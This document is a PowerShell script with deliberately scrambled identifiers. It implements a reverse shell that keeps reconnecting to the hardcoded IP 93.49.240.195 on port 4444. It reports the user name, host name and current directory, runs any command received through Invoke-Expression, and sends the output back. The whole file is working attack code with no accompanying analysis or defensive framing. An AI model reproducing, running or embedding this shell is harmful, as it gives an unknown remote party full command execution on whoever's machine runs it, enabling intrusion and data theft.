class DaoWdIHPhorRzdV {
    
    [string]$fvAKhepXQJKxXlZWVCuJ = "93.49.240.195"
    [int]$oihtZITPxqAkGqVQAI = 4444

    $QkubQ
    $VTUflfxHMnHWcJKPC
    $fCHjYMWwvABsIflyPxZphFrS
    $xkLxRyY
    $gCnjzXZmua
    $lpFXqMzIEVlayRvtqIQFO
    [int]$xeRoapyGANY = 50*1024

    NYhizAXgMRlpmOZpZs() {
        $this.VTUflfxHMnHWcJKPC = $false
        while ($true) {
            try {
                $this.VTUflfxHMnHWcJKPC = New-Object Net.Sockets.TcpClient($this.fvAKhepXQJKxXlZWVCuJ, $this.oihtZITPxqAkGqVQAI)
                break
            } catch [System.Net.Sockets.SocketException] {
                Start-Sleep -Seconds 5
            }
        }
        $this.hBYVzyEzEMtufekgeRDTzlDW()
    }

    hBYVzyEzEMtufekgeRDTzlDW() {
        $this.QkubQ = $this.VTUflfxHMnHWcJKPC.GetStream()
        $this.xkLxRyY = New-Object Byte[] $this.xeRoapyGANY
        $this.lpFXqMzIEVlayRvtqIQFO = New-Object Text.UTF8Encoding
        $this.fCHjYMWwvABsIflyPxZphFrS = New-Object IO.StreamWriter($this.QkubQ, [Text.Encoding]::UTF8, $this.xeRoapyGANY)
        $this.gCnjzXZmua = New-Object System.IO.StreamReader($this.QkubQ)
        $this.fCHjYMWwvABsIflyPxZphFrS.AutoFlush = $true
    }

    yhPiGgYHyh() {
        $this.NYhizAXgMRlpmOZpZs()
        $this.OKSSrsKbiwfyMltwvyRWzuJ()
    }

    cIXyMlemj($DijNQxf) {
        try {
            [byte[]]$rygSdPXF = [text.Encoding]::Ascii.GetBytes($DijNQxf)
            $this.fCHjYMWwvABsIflyPxZphFrS.Write($rygSdPXF, 0, $rygSdPXF.length)   
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.yhPiGgYHyh()
        }
    }

    [string] DjiJx() {
        try {
            $yJGWwbgLjsylRNs = $this.QkubQ.Read($this.xkLxRyY, 0, $this.xeRoapyGANY)    
            $qPrpTkjkVhGCaKZdpV = ($this.lpFXqMzIEVlayRvtqIQFO.GetString($this.xkLxRyY, 0, $yJGWwbgLjsylRNs))
            return $qPrpTkjkVhGCaKZdpV
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.yhPiGgYHyh()
            return ""
        }
    }

    [string] IEJglxOku($bxJrvsKDSfB) {
        Write-Host $bxJrvsKDSfB
        try { 
            $CbdBHMslFwyHgrqCfN = Invoke-Expression $bxJrvsKDSfB | Out-String
        }
        catch {
            $ntVhbyRrpoWvFRYIU = $_.Exception
            $sHbUqljfXCyGtznA = $_.Message
            $CbdBHMslFwyHgrqCfN = "`n$_`n"
        }
        return $CbdBHMslFwyHgrqCfN
    }

    [string] bufLitnx() {
        $eaDhnzHpTiHBvOeSElXZIBSL = [Environment]::UserName
        $hAtaWvCjPIoreLxnvBjAbg = [System.Net.Dns]::GetHostName()
        $eTJXUnQYJMsBpdZNToBOFm = Get-Location
        return "$eaDhnzHpTiHBvOeSElXZIBSL@$hAtaWvCjPIoreLxnvBjAbg [$eTJXUnQYJMsBpdZNToBOFm]~$ "
    }

    OKSSrsKbiwfyMltwvyRWzuJ() {
        while ($this.VTUflfxHMnHWcJKPC.Connected) {
            $this.cIXyMlemj($this.bufLitnx())         
            $qPrpTkjkVhGCaKZdpV = $this.DjiJx()
            $CbdBHMslFwyHgrqCfN = "`n"
            if ([string]::IsNullOrEmpty($qPrpTkjkVhGCaKZdpV)) {
                continue
            }
            $CbdBHMslFwyHgrqCfN = $this.IEJglxOku($qPrpTkjkVhGCaKZdpV)
            $this.cIXyMlemj($CbdBHMslFwyHgrqCfN + "`n")
            $this.QkubQ.Flush()
        }
        $this.VTUflfxHMnHWcJKPC.Close()
        $this.yhPiGgYHyh()
    } 
}

$siVyaPQ = [DaoWdIHPhorRzdV]::new()
$siVyaPQ.yhPiGgYHyh()
